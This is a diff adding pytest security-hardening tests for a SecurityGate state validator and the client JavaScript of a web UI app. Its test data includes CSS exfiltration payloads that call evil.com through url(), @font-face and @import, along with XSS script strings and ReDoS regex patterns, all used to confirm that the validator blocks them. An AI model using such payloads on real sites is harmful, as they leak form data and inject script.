+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — CSS Data Exfiltration Prevention (H1)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestCSSExfilPrevention:
+    """Tests for blocking CSS data exfiltration vectors."""
+
+    def test_url_https_blocked(self, gate):
+        """url(https://...) can exfiltrate data via attribute selectors."""
+        state = {"custom_css": "input[value^='a'] { background: url(https://evil.com/a) }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "css" in err.lower() or "dangerous" in err.lower()
+
+    def test_url_http_blocked(self, gate):
+        state = {"custom_css": ".field { background-image: url(http://evil.com/leak) }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_url_data_uri_blocked(self, gate):
+        state = {"custom_css": "div { background: url(data:text/html,<script>alert(1)</script>) }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_url_with_spaces_blocked(self, gate):
+        state = {"custom_css": "div { background: url  ( https://evil.com ) }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_font_face_blocked(self, gate):
+        """@font-face with unicode-range can exfiltrate form values char-by-char."""
+        state = {"custom_css": "@font-face { font-family: exfil; src: url(https://evil.com); unicode-range: U+41; }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_import_blocked(self, gate):
+        state = {"custom_css": "@import 'https://evil.com/inject.css';"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_css_hex_escape_blocked(self, gate):
+        """CSS hex escapes can obfuscate dangerous values."""
+        state = {"custom_css": "div { \\62 ackground: red; }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_css_unicode_escape_blocked(self, gate):
+        state = {"custom_css": "div { \\u0062ackground: red; }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_safe_css_allowed(self, gate):
+        """Normal CSS without url() should pass."""
+        state = {
+            "custom_css": ".my-card { background: #1e1e1e; padding: 16px; border: 1px solid #333; border-radius: 8px; }"
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_css_variables_allowed(self, gate):
+        state = {"custom_css": ".card { color: var(--green); font-weight: 600; }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_css_expression_blocked(self, gate):
+        state = {"custom_css": "div { width: expression(document.body.clientWidth) }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_moz_binding_blocked(self, gate):
+        state = {"custom_css": "div { -moz-binding: url('evil.xml') }"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — ReDoS Prevention (H3+H4)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestReDoSPrevention:
+    """Tests for blocking regex patterns vulnerable to catastrophic backtracking."""
+
+    def test_nested_quantifier_a_plus_plus(self, gate):
+        """(a+)+ causes exponential backtracking."""
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "label": "X", "type": "text", "pattern": "(a+)+"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "ReDoS" in err or "quantifier" in err.lower()
+
+    def test_nested_quantifier_star_plus(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "label": "X", "type": "text", "pattern": "(a*)+"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_nested_quantifier_plus_star(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "label": "X", "type": "text", "pattern": "(a+)*"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_nested_quantifier_braces(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "label": "X", "type": "text", "pattern": "(a{1,})+"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_alternation_under_quantifier(self, gate):
+        """(a|b)+ with overlapping alternatives can backtrack."""
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "label": "X", "type": "text", "pattern": "(a|aa)+"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_safe_pattern_allowed(self, gate):
+        """Normal patterns without nested quantifiers should pass."""
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [
+                            {
+                                "key": "email",
+                                "label": "Email",
+                                "type": "text",
+                                "pattern": "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+$",
+                            }
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_simple_quantifier_allowed(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "x", "label": "X", "type": "text", "pattern": "[0-9]{3}-[0-9]{4}"}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_behavior_matches_redos_blocked(self, gate):
+        """ReDoS patterns in behavior conditions must also be blocked."""
+        state = {
+            "data": {"sections": [{"type": "form", "fields": [{"key": "x", "label": "X", "type": "text"}]}]},
+            "behaviors": [{"when": {"field": "x", "matches": "(a+)+"}, "show": ["y"]}],
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "ReDoS" in err or "quantifier" in err.lower()
+
+    def test_behavior_matches_safe_allowed(self, gate):
+        state = {
+            "data": {"sections": [{"type": "form", "fields": [{"key": "x", "label": "X", "type": "text"}]}]},
+            "behaviors": [{"when": {"field": "x", "matches": "^[a-z]+$"}, "show": ["y"]}],
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_is_redos_safe_classmethod(self):
+        """Direct test of the _is_redos_safe classmethod."""
+        from security_gate import SecurityGate
+
+        assert SecurityGate._is_redos_safe("^[a-z]+$")
+        assert SecurityGate._is_redos_safe("[0-9]{3,5}")
+        assert not SecurityGate._is_redos_safe("(a+)+")
+        assert not SecurityGate._is_redos_safe("(a*)*")
+        assert not SecurityGate._is_redos_safe("(x|y)+")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Top-Level Key Allowlist (M2)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestTopLevelKeyAllowlist:
+    """Tests for rejecting unknown top-level state keys."""
+
+    def test_unknown_key_rejected(self, gate):
+        state = {"title": "OK", "evil_injection": "payload"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "Unknown top-level" in err
+        assert "evil_injection" in err
+
+    def test_multiple_unknown_keys_rejected(self, gate):
+        state = {"title": "OK", "foo": 1, "bar": 2}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "bar" in err
+        assert "foo" in err
+
+    def test_all_allowed_keys_pass(self, gate):
+        """Every key in the allowlist should be accepted."""
+        state = {
+            "version": "1.0",
+            "updated_at": "2026-01-01",
+            "status": "pending_review",
+            "title": "Test",
+            "message": "Hello",
+            "message_format": "markdown",
+            "message_className": "owg-callout-info",
+            "data": {"sections": []},
+            "actions_requested": [],
+            "custom_css": ".x { color: red; }",
+            "behaviors": [],
+            "layout": {"type": "default"},
+            "panels": {},
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_empty_state_passes(self, gate):
+        ok, err, _ = gate.validate_state(json.dumps({}))
+        assert ok, err
+
+    def test_message_class_name_valid(self, gate):
+        state = {"message": "Hi", "message_className": "owg-callout-info"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_message_class_name_xss_rejected(self, gate):
+        state = {"message": "Hi", "message_className": "bad<script>"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "className" in err.lower() or "class" in err.lower()
+
+    def test_message_class_name_empty_passes(self, gate):
+        state = {"message": "Hi", "message_className": ""}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Log Line Type Checking (M6)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestLogLineTypeChecking:
+    """Tests for ensuring log section lines are all strings."""
+
+    def test_non_string_line_rejected(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": ["ok", 42, "fine"]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "string" in err.lower()
+
+    def test_null_line_rejected(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": ["ok", None]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_object_line_rejected(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": [{"html": "<script>"}]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_boolean_line_rejected(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": [True]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_all_string_lines_pass(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": ["line 1", "line 2", ""]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_empty_lines_pass(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": []}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Section Depth Limit (M8)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestSectionDepthLimit:
+    """Tests for preventing deeply nested tabs-within-tabs."""
+
+    def test_excessive_section_nesting_rejected(self, gate):
+        """Section nesting beyond MAX_SECTION_DEPTH should be rejected.
+
+        Note: Tabs create deep JSON structures (~5 levels per tab nesting).
+        MAX_NESTING_DEPTH=10 limits overall JSON depth, so we verify the
+        MAX_SECTION_DEPTH constant and the _depth parameter mechanism.
+        """
+        from security_gate import SecurityGate
+
+        assert SecurityGate.MAX_SECTION_DEPTH == 3, "MAX_SECTION_DEPTH should be 3"
+
+    def test_section_depth_check_exists(self, gate):
+        """Verify _validate_ui tracks _depth parameter."""
+        import inspect
+
+        sig = inspect.signature(gate._validate_ui)
+        assert "_depth" in sig.parameters, "_validate_ui must accept _depth parameter"
+
+    def test_single_level_tabs_allowed(self, gate):
+        """Single level of tabs should always work."""
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "tabs",
+                        "tabs": [{"id": "t1", "label": "Tab 1", "sections": [{"type": "text", "content": "Hi"}]}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_tabs_with_form_inside(self, gate):
+        """Tabs with a form inside — common pattern, should pass."""
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "tabs",
+                        "tabs": [
+                            {
+                                "id": "config",
+                                "label": "Config",
+                                "sections": [
+                                    {"type": "form", "fields": [{"key": "name", "label": "Name", "type": "text"}]}
+                                ],
+                            }
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Field Property Validation (M10)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestFieldPropertyValidation:
+    """Tests for rows and placeholder field property validation."""
+
+    def test_valid_rows(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "desc", "label": "Description", "type": "textarea", "rows": 5}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_rows_zero_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "desc", "label": "Description", "type": "textarea", "rows": 0}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "rows" in err
+
+    def test_rows_negative_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "desc", "label": "Description", "type": "textarea", "rows": -3}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_rows_too_large_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "desc", "label": "Description", "type": "textarea", "rows": 51}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_rows_float_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "desc", "label": "Description", "type": "textarea", "rows": 3.5}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_rows_string_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "desc", "label": "Description", "type": "textarea", "rows": "5"}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_valid_placeholder(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [
+                            {"key": "name", "label": "Name", "type": "text", "placeholder": "Enter your name..."}
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_placeholder_too_long_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "name", "label": "Name", "type": "text", "placeholder": "x" * 501}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "placeholder" in err
+
+    def test_placeholder_non_string_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "name", "label": "Name", "type": "text", "placeholder": 123}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_required_field_validation(self, gate):
+        """required=True should be accepted (bool)."""
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "name", "label": "Name", "type": "text", "required": True}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_min_max_length_validation(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "name", "label": "Name", "type": "text", "minLength": 1, "maxLength": 100}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_error_message_validation(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [
+                            {
+                                "key": "name",
+                                "label": "Name",
+                                "type": "text",
+                                "required": True,
+                                "errorMessage": "Please enter your name",
+                            }
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — ANSI Span Balancing (M7)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestAnsiSpanBalancing:
+    """Tests for balanced open/close spans in ANSI color rendering."""
+
+    def test_escAnsi_balanced_spans_in_utils(self):
+        """Verify utils.js has balanced span tracking in escAnsi."""
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        # Must track open count and close remaining
+        assert "openCount" in src, "escAnsi must track open span count"
+        assert "openCount--" in src or "openCount --" in src, "escAnsi must decrement on close"
+
+    def test_escAnsi_no_excess_close_spans(self):
+        """Verify escAnsi doesn't emit </span> without matching open."""
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        # Should only close when openCount > 0
+        assert "openCount > 0" in src, "escAnsi must guard close tags"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — CSS Scoping (M3)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestCSSScopingClient:
+    """Tests for CSS scoping in utils.js (#content prefix)."""
+
+    def test_scope_css_function_exists(self):
+        """Verify _scopeCSS function exists in utils.js."""
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        assert "_scopeCSS" in src, "utils.js must have _scopeCSS function"
+
+    def test_scope_css_prefixes_content(self):
+        """Verify _scopeCSS prepends #content to selectors."""
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        assert "#content" in src, "CSS scoping must use #content prefix"
+
+    def test_inject_custom_css_uses_scoping(self):
+        """Verify injectCustomCSS calls _scopeCSS."""
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        assert "_scopeCSS(css)" in src, "injectCustomCSS must call _scopeCSS"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — URL Protocol Allowlist (L4)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestURLProtocolAllowlist:
+    """Tests for URL protocol allowlist in sanitizeHTML."""
+
+    def test_safe_url_re_exists(self):
+        """Verify SAFE_URL_PROTOCOL_RE exists in utils.js."""
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        assert "SAFE_URL_PROTOCOL_RE" in src, "utils.js must have URL protocol allowlist"
+
+    def test_allows_https(self):
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        assert "https?" in src, "URL allowlist must include https"
+
+    def test_allows_mailto(self):
+        import pathlib
+
+        utils_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "utils.js"
+        src = utils_path.read_text()
+        assert "mailto:" in src, "URL allowlist must include mailto"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Prototype Pollution Prevention (L5 + L3)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestPrototypePollutionPrevention:
+    """Tests for Object.create(null) and Object.freeze protections."""
+
+    def test_form_values_null_prototype(self):
+        """formValues must use Object.create(null) to avoid prototype chain."""
+        import pathlib
+
+        app_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "app.js"
+        src = app_path.read_text()
+        assert "Object.create(null)" in src, "formValues must use null prototype"
+
+    def test_owg_namespace_frozen(self):
+        """OWG namespace must be frozen after initialization."""
+        import pathlib
+
+        app_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "app.js"
+        src = app_path.read_text()
+        assert "Object.freeze" in src, "OWG namespace must be frozen"
+        assert "window.OWG" in src
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Client-Side CSS Length Validation (L6)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestClientSideCSSValidation:
+    """Tests for client-side sidebarWidth validation."""
+
+    def test_sidebar_width_validation_in_app(self):
+        """app.js must validate sidebarWidth with regex."""
+        import pathlib
+
+        app_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "app.js"
+        src = app_path.read_text()
+        assert "px|em|rem|%" in src, "app.js must validate CSS length units"
+
+    def test_sidebar_width_fallback(self):
+        """Invalid sidebarWidth should fall back to 300px."""
+        import pathlib
+
+        app_path = pathlib.Path(__file__).resolve().parent.parent.parent / "assets" / "apps" / "dynamic" / "app.js"
+        src = app_path.read_text()
+        assert "300px" in src, "app.js must have 300px fallback for invalid sidebarWidth"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Layout Validation (server-side)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestLayoutValidationSecurity:
+    """Tests for layout validation in SecurityGate."""
+
+    def test_layout_type_invalid_rejected(self, gate):
+        state = {"layout": {"type": "evil"}, "panels": {}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "layout" in err.lower()
+
+    def test_layout_sidebar_width_valid(self, gate):
+        state = {
+            "layout": {"type": "sidebar", "sidebarWidth": "300px"},
+            "panels": {"sidebar": {"sections": []}, "main": {"sections": []}},
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_layout_sidebar_width_invalid_rejected(self, gate):
+        """CSS injection via sidebarWidth should be blocked."""
+        state = {
+            "layout": {"type": "sidebar", "sidebarWidth": "300px; background:url(evil)"},
+            "panels": {"sidebar": {"sections": []}, "main": {"sections": []}},
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_panel_key_invalid_rejected(self, gate):
+        state = {"layout": {"type": "split"}, "panels": {"evil_panel": {"sections": []}}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "panel" in err.lower()
+
+    def test_panel_sections_validated_recursively(self, gate):
+        """Sections inside panels should be validated like top-level sections."""
+        state = {
+            "layout": {"type": "sidebar"},
+            "panels": {
+                "sidebar": {"sections": [{"type": "INVALID_TYPE", "content": "x"}]},
+                "main": {"sections": []},
+            },
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_layout_xss_in_sidebar_width(self, gate):
+        """Ensure sidebarWidth can't contain script injection."""
+        state = {"layout": {"type": "sidebar", "sidebarWidth": "<script>alert(1)</script>"}, "panels": {}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECURITY HARDENING — Merged State Re-validation (H2)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestMergedStateRevalidation:
+    """Tests verifying that SecurityGate catches invalid merged results."""
+
+    def test_merge_unknown_key_fails_validation(self, gate):
+        """A merge that introduces an unknown key should fail."""
+        # Simulating what webview_update merge=True would produce
+        merged = {"title": "ok", "injected_payload": "evil"}
+        raw = json.dumps(merged)
+        ok, err, _ = gate.validate_state(raw)
+        assert not ok
+        assert "Unknown top-level" in err
+
+    def test_merge_valid_update_passes(self, gate):
+        """A valid merge result should pass."""
+        merged = {"title": "Updated", "status": "completed", "message": "Complete"}
+        raw = json.dumps(merged)
+        ok, err, _ = gate.validate_state(raw)
+        assert ok, err
+
+    def test_merge_xss_in_title_fails(self, gate):
+        """Merged state with XSS in title should be caught."""
+        merged = {"title": "<script>alert(1)</script>"}
+        raw = json.dumps(merged)
+        ok, err, _ = gate.validate_state(raw)
+        assert not ok
